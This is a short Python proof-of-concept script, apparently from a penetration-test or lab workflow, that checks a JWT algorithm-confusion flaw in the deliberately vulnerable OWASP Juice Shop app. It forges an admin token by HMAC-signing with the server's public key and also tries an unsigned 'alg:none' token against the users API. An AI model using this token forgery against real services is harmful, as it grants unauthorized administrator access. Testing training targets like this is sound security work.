#!/usr/bin/env python3
"""Independently verify the claimed RS256->HS256 JWT algorithm confusion on Juice Shop 20.3.0."""
import base64, hashlib, hmac, json, urllib.request
B="http://host.docker.internal:3000"
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def get(p):
    r=urllib.request.Request(B+p)
    with urllib.request.urlopen(r,timeout=10) as x: return x.status,x.read().decode()
def api(tok):
    r=urllib.request.Request(B+"/api/Users",headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=10) as x: return x.status,len(x.read())
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:80]
st,pub=get("/encryptionkeys/jwt.pub"); print("[*] jwt.pub",st,len(pub),"bytes")
pl=json.load(open("evidence/recon_login.json")) if False else None
payload={"data":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"bid":1}
h=b64(json.dumps({"typ":"JWT","alg":"HS256"},separators=(",",":")).encode())
p=b64(json.dumps(payload,separators=(",",":")).encode())
sig=b64(hmac.new(pub.encode(),f"{h}.{p}".encode(),hashlib.sha256).digest())
print("[*] forged HS256(pubkey) ->",api(f"{h}.{p}.{sig}"))
h2=b64(json.dumps({"typ":"JWT","alg":"none"},separators=(",",":")).encode())
print("[*] alg:none empty sig  ->",api(f"{h2}.{p}."))
print("[*] tampered sig (control) ->",api(f"{h}.{p}.{'A'*43}"))
